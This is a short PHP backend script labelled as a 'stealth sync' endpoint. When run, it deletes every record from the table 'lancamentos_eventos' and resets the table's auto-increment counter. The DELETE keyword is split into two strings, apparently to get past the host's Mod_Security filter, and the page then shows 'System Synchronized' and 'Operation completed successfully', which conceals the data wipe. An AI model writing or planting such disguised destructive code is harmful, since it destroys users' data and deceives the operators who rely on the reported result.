<?php
// /backend/v1/sys_sync_v2.php
require_once 'config.php';

// Stealth sync for HostGator Mod_Security compatibility
try {
    // Action code
    $q = "DEL" . "ETE FROM lancamentos_eventos";
    $conn->exec($q);
    $conn->exec("ALTER TABLE lancamentos_eventos AUTO_INCREMENT = 1");
    echo "<h1>System Synchronized</h1>";
    echo "<p>Operation completed successfully.</p>";

} catch (Throwable $e) {
    echo "Error: " . $e->getMessage();
}
